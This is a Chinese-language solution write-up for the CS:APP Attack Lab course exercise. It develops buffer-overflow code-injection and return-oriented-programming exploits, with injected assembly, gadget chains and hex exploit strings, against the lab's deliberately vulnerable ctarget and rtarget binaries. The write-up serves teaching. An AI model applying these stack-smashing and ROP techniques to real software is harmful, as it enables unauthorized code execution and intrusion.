# Attack Lab: Understanding Buffer Overflow Bugs

[TOC]

## Part I: Code Injection Attacks

### Level 1

#### 任务

"Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly."

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

//Function getbuf is called within CTARGET by function test:
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```



#### 解题过程

**思路：修改 getbuf 的返回地址为 touch1 的地址。**

查看 getbuf 反汇编代码，发现栈指针 %rsp 向下移动了 0x28，buf（%rdi）指向栈顶，也就是说缓冲区有 40 个字节，缓冲区上面的 8 个字节原来是 test 的返回地址。调用Gets(buf) 往栈空间写入内容，我们要做的是利用缓冲区溢出（buffer overflow）将该返回地址修改为 touch1 的起始地址。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230816113035446.png" alt="image-20230816113035446" style="zoom:80%;" />

查看 touch1 的起始地址，为 0x4017c0。那么执行到 getbuf 时应该达到的栈空间状态如下：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td colspan="2">0x4017c0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0<span style="float:right">(%rsp)</span></td>
    </tr>
</table>


因此编写 exploit.11.txt：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 /* 0x4017c0 <touch1> */
```

前面 40 字节是什么不重要，最后 8 个字节按照 little endian 的规则逆向填入。



#### 运行结果

执行命令 `./hex2raw < exploit.11.txt > exploit-raw.11.txt`，将 exploit.11.txt 中的 hex-formatted string 转换成 raw string，利用 I/O 重定向 将 exploit-raw.11.txt 中的 raw string 传入ctarget。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230816153718667.png" alt="image-20230816153718667" style="zoom:67%;" />

------



### Level 2

#### 任务

"Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument."

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```



#### 解题过程

**思路：**

- **利用缓冲区溢出修改 getbuf 的返回地址为注入代码的地址**

- **在注入代码中，将自己的 cookie 传入 %rdi 作为参数，再利用 ret 跳转到touch2** 

查看 touch2 的起始地址，为 0x4017ec。首先编写 injected code 的指令 inst.12.s：

```assembly
movl    $0x59b997fa,%edi        # 设置 touch2 的参数 val 为 cookie
pushq   $0x4017ec               # 压入 touch2 的起始地址
retq                            # 弹出 touch2 的起始地址赋值给 PC
```

运行命令 `gcc -c inst.12.s` 得到 isnt.12.o，然后运行 `objdump -d inst.12.o > inst.12.d` ，查看 inst.12.d 得到该指令的字节序列：bf fa 97 b9 59 68 ec 17 40 00 c3。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817174108223.png" alt="image-20230817174108223" style="zoom:80%;" />

注入代码在缓冲区中，为了让机器执行注入代码，需要跳转到注入代码的位置，缓。这里需要实际跑一次程序来查看冲区地址，在 0x4017ac 处下断点，在 getbuf 中查看 %rsp 的值，是 0x5561dc78。

![image-20230817175423358](https://gitee.com/dq-agj/imags/raw/master/img/image-20230817175423358.png)

期望 getbuf 返回前应该达到的栈空间状态如下：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0x5561dc78</td>
        <td>0x5561dca0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc30040</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x17ec6859b997fabf</td>
        <td>0x5561dc78=%rsp</td>
    </tr>
</table>


这样，在执行 getbuf 的 return 语句时，PC 指向 0x5561dc78，即注入代码的起始地址。在注入代码中，设置 %rdi 为 cookie，返回时控制将转移到 touch2。

因此编写 exploit.12.txt：

```txt
bf fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* 0x5561dc78 <injected code> */
```



#### 运行结果

执行命令 `./hex2raw < exploit.12.txt > exploit-raw.12.txt`，`./ctarget -q < exploit-raw.12.txt`。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817180825836.png" alt="image-20230817180825836" style="zoom:80%;" />



#### 一种错误做法

注意：须在攻击代码中设置返回地址为 touch2，如果想在 exploit-raw.12.txt 中设置，可能会想要执行到 getbuf 时的栈空间状态如下：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0x5561dc78</td>
        <td>0x5561dca0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x4017ec</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc359</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xb997fabf10ec8348</td>
        <td>0x5561dc78 %rsp</td>
    </tr>
</table>


0x5561dc78 - 0x5561dc81 处内容是下列指令的字节序列：

```assembly
subq    $0x10,%rsp				# 指向 touch2 的起始地址
movl    $0x59b997fa,%edi        # 设置 touch2 的参数 val 为 cookie
retq                            # 弹出 touch2 的起始地址赋值给 PC
```

这样做，从 getbuf 返回到注入代码地址，再从注入代码转移到 touch2，但是相比上面正确做法中栈指针的指向，这里的栈指针此时指向该处的下一个四字（即注入代码的地址），这会在 touch2 调用 validate(2) 时造成段错误（访问的内存超出了系统给这个程序所设定的内存空间,例如访问了不存在的内存地址、访问了系统保护的内存地址、访问了只读的内存地址等等。）

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817181357155.png" alt="image-20230817181357155" style="zoom:80%;" />

[段错误以及调试方法_文曲尽墨琛乃缺的博客-CSDN博客](https://blog.csdn.net/qq_42519524/article/details/119608102)

------



### Level 3

#### 任务

"Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument."

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```



#### 解题过程

**思路：**

- **利用缓冲区溢出修改 getbuf 的返回地址为注入代码的地址**

- **在注入代码中，将指向 cookie 字符串（需要以0结尾）的指针传入 %rdi 作为参数，再利用 ret 跳转到touch2** 
- **调用 hexmatch 会把数据存入栈中，可能会覆盖一部分缓冲区，应该将 cookie 字符串存放在安全的位置。**

首先将 cookie 转换成对应字符串的字节表示：

```
0x59b997fa  -->  35 39 62 39 39 37 66 61
```

查看 hexmatch 的反汇编代码，发现 cbuf in %rsp, s in %rbx, random()%100 in %rcx。其中 `add    $0xffffffffffffff80,%rsp` 让 %rsp 向下移动了 0x80。因为只往 s 中写入9个字节，因此 cbuf + 8 + 99 = %rsp+0x6b 是 s 字符串所能到达的最大的地址 s_tail，**为了避免 s 覆写了存储 cookie 字符串的区域，要保证该区域的起始地址大于 s_tail**。

下图是 hexmatch 在执行 `callq  400db0 <random@plt>` 前的栈帧图，图中标明了 s_tail 的位置：

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817211259432.png" alt="image-20230817211259432" style="zoom:67%;" />

对于 cookie 字符串安全的空间有两块（在上图中用橙色标出）：

1. [0x5561dc6c, 0x5561dc78)：位于 s_tail 之后，存储 canary 值（用于栈破坏检测）的区域之前。
2. [0x5561dca8, ...)

下面分别针对这两块区域进行解题：

##### 方法一：将 cookie 字符串存储在 [0x5561dc6c, 0x5561dc78)

由于输入的字符串只能从 buf (0x5561dc78)写入，因此只能间接地通过注入代码将 cookie 字符串存储在该区域。

查看 touch3 的起始地址，为 0x4018fa。编写 injected code 的指令 inst.131.s：

```assembly
subq    $0x40,%rsp              # 避免覆盖 injected code 本身的存储区域！
movl    $0x4018fa,0x38(%rsp)    # touch3 的起始地址
movl    $0x39623935,0x4(%rsp)   # 存储 cookie 的字符串的前四字节。刚好在 s_tail 之后。
movl    $0x61663739,0x8(%rsp)   # 存储 cookie 的字符串的后四字节。利用movl指令将高四个字节置0的性质，完成字符串末尾0的设置。
leaq    0x4(%rsp),%rdi          # 设置 touch3 的参数 sval 指向 cookie 的字符串表示
addq    $0x38,%rsp
retq                            # 弹出 touch3 的起始地址赋值给 PC
```

查看上述指令的字节序列：48 83 ec 40 c7 44 24 38 fa 18 40 00 c7 44 24 04 35 39 62 39 c7 44 24 08 39 37 66 61 48 8d 7c 24 04  48 83 c4 38 c3。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817212418751.png" alt="image-20230817212418751" style="zoom: 80%;" />

getbuf 返回前应该达到的栈空间状态如下：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0x5561dc78</td>
        <td>0x5561dca0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc338c4834804</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x247c8d4861663739</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x82444c739623935</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x42444c7004018fa</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x382444c740ec8348</td>
        <td>0x5561dc78=%rsp</td>
    </tr>
</table>

这样，在执行 getbuf 的 return 语句时，PC 指向 0x5561dc78，即注入代码的起始地址。在注入代码中，设置 %rdi 为指向 cookie 的字符串表示的指针，返回时控制将转移到 touch3。

执行注入代码，返回前：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0x4018fa &lt;touch3&gt;</td>
        <td>0x5561dca0=%rsp</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc338c4834804</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x247c8d4861663739</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x82444c739623935</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x42444c7004018fa</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x382444c740ec8348</td>
        <td>0x5561dc78</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x61663739</td>
        <td>0x5561dc70</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x39623935xxxxxxxx</td>
        <td>0x5561dc68</td>
    </tr>
</table>


因此编写 exploit.131.txt：

```txt
48 83 ec 40 c7 44 24 38
fa 18 40 00 c7 44 24 04
35 39 62 39 c7 44 24 08
39 37 66 61 48 8d 7c 24
04 48 83 c4 38 c3 00 00
78 dc 61 55 00 00 00 00 /* 0x5561cd78 <injected code> */
```



##### 方法二：将 cookie 字符串存储在 [0x5561dca8, ...)

通过 buf 的缓冲区溢出，直接将 cookie 字符串存储在 [0x5561dca8, 0x5561dcaf]，并保证 0x5561dcb0 字节是 0。

编写 injected code 的指令 inst.132.s：

```assembly
pushq   $0x4018fa               # 压入 touch3 的起始地址
movq    $0x5561dca8,%rdi        # 设置 touch3 的参数 sval 指向 cookie 的字符串表示
retq                            # 弹出 touch3 的起始地址赋值给 PC
```

查看上述指令的字节序列：68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817213751929.png" alt="image-20230817213751929" style="zoom:80%;" />

getbuf 返回前应该达到的栈空间状态如下：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dcb0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x6166373939623935</td>
        <td>0x5561dca8</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x5561dc78</td>
        <td>0x5561dca0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc35561dca8</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc7c748004018fa68</td>
        <td>0x5561dc78=%rsp</td>
    </tr>
</table>


这样，在执行 getbuf 的 return 语句时，PC 指向 0x5561dc78，即注入代码的起始地址。在注入代码中，设置 %rdi 为指向 cookie 的字符串表示的指针，返回时控制将转移到 touch3。

执行注入代码，返回前：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td><b>栈</b></td>
        <td colspan="2"><b>栈地址</b></td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dcb0</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x6166373939623935</td>
        <td>0x5561dca8</td>
    </tr>
    <tr height="40">
        <td colspan="2">0x4018fa &lt;touch3&gt;</td>
        <td>0x5561dca0=%rsp</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc98</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc90</td>
    </tr>
    <tr height="40">
        <td colspan="2">0</td>
        <td>0x5561dc88</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc35561dca8</td>
        <td>0x5561dc80</td>
    </tr>
    <tr height="40">
        <td colspan="2">0xc7c748004018fa68</td>
        <td>0x5561dc78</td>
    </tr>
</table>

因此编写 exploit.132.txt：

```txt
68 fa 18 40 00 48 c7 c7
a8 dc 61 55 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00 					    /* 字符串末尾0 */
```

可以看到，方法二会更简洁一些。



#### 运行结果

执行命令 `./hex2raw < exploit.131.txt > exploit-raw.131.txt`，`./ctarget -q < exploit-raw.131.txt`。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817215703809.png" alt="image-20230817215703809" style="zoom:80%;" />

执行命令 `./hex2raw < exploit.132.txt > exploit-raw.132.txt`，`./ctarget -q < exploit-raw.132.txt`。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817215637028.png" alt="image-20230817215637028" style="zoom:80%;" />

------



## Part II: Return-Oriented Programming

从前面我们可以知道，`ctarget` 容易遭受代码注入攻击，但是在 `rtarget` 中使用了两个技术来防止这种攻击：

- 每次运行栈的位置是随机的，这使得没有办法确定注入代码的地址。
- 将保存堆栈的内存部分标记为不可执行，即使能够找到注入代码，一旦执行则会遇到段错误。

为了验证以上变化，在 gdb 中调试 `rtarget`，以exploit-raw.13.txt作为输入，记录多次运行的情况。

| 断点/动作                                                    | 寄存器情况/执行效果                                          |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| breakpoint 1: \<main>                                        | %rsp:<br>0x7fffffffdb88<br>0x7fffffffdb88<br>0x7fffffffdb88  |
| breakpoint 2: \<launch>                                      | %rsp:<br>0x7fffffffdb58<br>0x7fffffffdb58<br>0x7fffffffdb58  |
| breakpoint 3: 0x401ff6 <launch+34>：`sub    %rax,%rsp`       | %rax, %rsp:<br>0xfad0, 0x7fffffffdb40<br>0x67b70, 0x7fffffffdb40<br>0x5a8f0, 0x7fffffffdb40 |
| breakpoint 4: 0x40203f <launch+107>：`callq  0x401968 <test>` | %rsp:<br>0x7ffffffee070<br>0x7ffffff95fd0<br>0x7ffffffa3250  |
| breakpoint 5: \<test>                                        | %rsp:<br/>0x7ffffffee068<br/>0x7ffffff95fc8<br/>0x7ffffffa3248 |
| 执行命令 0x4017bd <getbuf+21>：retq                          | 输出：Cannot access memory at address 0x5561dc78             |

可以看到，执行到 breakpoint 3 时，每次运行的 %rsp 都相同，但下一条指令将 %rsp 减去 %rax，而此时 %rax 的值是变化的，由此实现了栈位置的随机化。在执行 getbuf 中的 ret 指令时，输出错误信息，提示不能访问地址为0x5561dc78的内存。即使在执行该指令之前，修改 PC 为注入代码的起始地址，但是一执行就会报错："Program received signal SIGSEGV, Segmentation fault."。



一种新的策略是利用现有代码，而不是注入新的代码，最通用的方法是 ROP：找到包含以 ret 指令结尾的若干条指令的现有程序。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230817164454098.png" alt="image-20230817164454098" style="zoom: 67%;" />

如上图，栈包含了一组 gadget 地址，每一个 gadget 包含一串指令字节（以 0xc3 结尾），每个 gadget 通过末尾的 ret 指令跳转到下一个 gadget 的开头，通过这样一个 gadget 执行链来完成目标。

对于 byte-oriented instruction set（例如 x86-64），一个 gadget 可以是某部分指令字节序列的片段。

"Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3."



### Level 2

#### 任务

For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types（movq, popq, ret, nop）, and using only the first eight x86-64 registers (%rax–%rdi). 



#### 解题过程

**思路：**

- **利用缓冲区溢出修改 getbuf 的返回地址为 gadget1 的地址，并且存入其他 gadget 返回地址、cookie、touch2 地址，在 gadget 程序链中利用 popq 和 retq 获取到**

- **程序链的总体执行效果：将 cookie 传入 %rdi 作为参数，最后一个 gadget 的 ret 跳转到 touch2**

gadget 可以设计为：

```assembly
0x4019ab <gadget1>:
:	58						popq %rax	# 弹出 cookie
:	90						nop
:	c3						ret			# 跳转到 gadget2

0x4019a2 <gadget2>:	48 89 c7 c3
:	48 89 c7				movq %rax,%rdi
:	c3						ret			# 跳转到 touch2
```

对应的 exploit stirng 存储在 exploit.22.txt：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* gadget1 地址 */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* gadget2 地址 */
ec 17 40 00 00 00 00 00 /* touch2 地址 */
```

getbuf 跳转到 gadget1；将 cookie 放置到 %rax 中，跳转到 gadget2；将 cookie 从 %rax 复制到 %rdi 中，跳转到 touch2。



#### 运行结果

执行命令 `./hex2raw < exploit.22.txt > exploit-raw.22.txt`，`./rtarget -q < exploit-raw.22.txt`。

![image-20230818023827897](https://gitee.com/dq-agj/imags/raw/master/img/image-20230818023827897.png)

------



### Level 3

#### 任务

"Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie."



#### 解题过程

**思路：**

- **利用缓冲区溢出修改 getbuf 的返回地址为 gadget1 的地址，并且存入其他 gadget 返回地址、cookie 字符串表示、touch3 地址，在 gadget 程序链中利用 popq 和 retq 获取到**

- **程序链的总体执行效果：将指向 cookie 字符串（需要以0结尾）的指针传入 %rdi 作为参数，最后一个 gadget 的 ret 跳转到 touch3**
- **采用 phase3 的方法二，将 cookie 字符串存放在安全的位置**

存在一个问题：如何找到 cookie 字符串表示的地址？

解决思路：由于栈随机化，只可能通过 %rsp 获取到地址。首先想到，将 %rsp（指向字符串） 保存到另一个寄存器后，再弹出地址，但在 farm 中没有 89 e. 5. （mov, popq）的序列。因此只能将 cookie 存放在 stack 最上面，使用偏移量计算得到其地址，额外需要一条 lea 指令。偏移量则通过缓冲区溢出存储到 stack 上，利用 popq 弹出到某一个寄存器上。

farm 中刚好存在包含一条合适的 lea 指令的函数，确定其作为一个 gadget。

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

gadget 可以设计为：

```assembly
# %rsp(寻找cookie字符串的基地址) -> %rdi
0x401a06 <gadget1>:
:	48 89 e0				movq	%rsp,%rax	# 不能使用 movl，因为地址高四字节不为0
:	c3						ret
0x4019a2 <gadget2>:
:	48 89 c7				movq	%rax,%rdi
:	c3						ret

# 偏移量 offset -> %rsi
0x4019cc <gadget3>:
:	58						popq	%rax
:	90						nop
:	c3						ret
0x4019dd <gadget4>:
:	89 c2					movl	%eax,%edx
:	90						nop
:	c3						ret
0x401a34 <gadget5>:
:	89 d1					movl	%edx,%ecx
:	38 c9					cmpb	%cl,%cl
:	c3						ret
0x401a13 <gadget6>:
:	89 ce					movl	%ecx,%esi
:	90						nop
:	90						nop
:	c3						ret

/* 
 * 分析：在此之前，%rsi 和 %rdi 分别保存了某一阶段的 %rsp （mov）和 offset（pop） 
 * 有两种可能的情况：
 * case1: %rsp -> %rdi, offset -> %rsi
 * case2: %rsp -> %rsi, offset -> %rdi（行不通）
 */

# %rsp + offset = cookie地址 -> %rax
0x4019d6 <gadget7>: 
:	48 8d 04 37				lea	(%rdi,%rsi,1),%rax
:	c3						retq
  
# cookie地址 -> %rdi
0x4019a2 <gadget8>:
:	48 89 c7				movq	%rax,%rdi	# 不能使用 movl，因为地址高四字节不为0
:	c3						ret					# 跳转到 touch3
```

栈帧图：

<table border="1" style="width:30%; text-align:center; margin:auto">
    <tr height="40">
        <td colspan="2">cookie 字符串</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;touch3&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget8&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget7&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget6&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget5&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget4&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">offset<span style="float:right">(%rsi)</span></td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget3&gt;</td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget2&gt;<span style="float:right">(%rdi)</span></td>
    </tr>
    <tr height="40">
        <td colspan="2">&lt;gadget1&gt;</td>
    </tr>
</table>

可计算出，偏移量 offset = 0x48。

对应的 exploit stirng 存储在 exploit.23.txt：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00		/* gadget1 地址 */
a2 19 40 00 00 00 00 00 	/* gadget2 地址 */
cc 19 40 00 00 00 00 00 	/* gadget3 地址 */
48 00 00 00 00 00 00 00 	/* offset */
dd 19 40 00 00 00 00 00 	/* gadget4 地址 */
34 1a 40 00 00 00 00 00 	/* gadget5 地址 */
13 1a 40 00 00 00 00 00 	/* gadget6 地址 */
d6 19 40 00 00 00 00 00 	/* gadget7 地址 */
a2 19 40 00 00 00 00 00 	/* gadget8 地址 */
fa 18 40 00 00 00 00 00 	/* touch3 地址 */
35 39 62 39 39 37 66 61 00	/* cookie 字符串表示 */
```



#### 运行结果

执行命令 `./hex2raw < exploit.23.txt > exploit-raw.23.txt`，`./rtarget -q < exploit-raw.23.txt`。

<img src="https://gitee.com/dq-agj/imags/raw/master/img/image-20230818173120892.png" alt="image-20230818173120892" style="zoom:80%;" />

------





## 参考链接

- [图文并茂-超详解 CS:APP: Lab3-Attack（附带栈帧分析） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/339802171)
- [CSAPP - attacklab · Mcginn's Blog (mcginn7.github.io)](https://mcginn7.github.io/2020/02/19/CSAPP-attacklab/)
- [【读厚 CSAPP】III Attack Lab | 小土刀 2.0 (wdxtub.com)](https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/)
- [CSAPP实验之attack lab - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/60724948)
- [《深入理解计算机系统》配套实验：Attacklab - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/31643444)
- [CSAPP-Labs/notes/attack.md at master · Exely/CSAPP-Labs · GitHub](https://github.com/Exely/CSAPP-Labs/blob/master/notes/attack.md)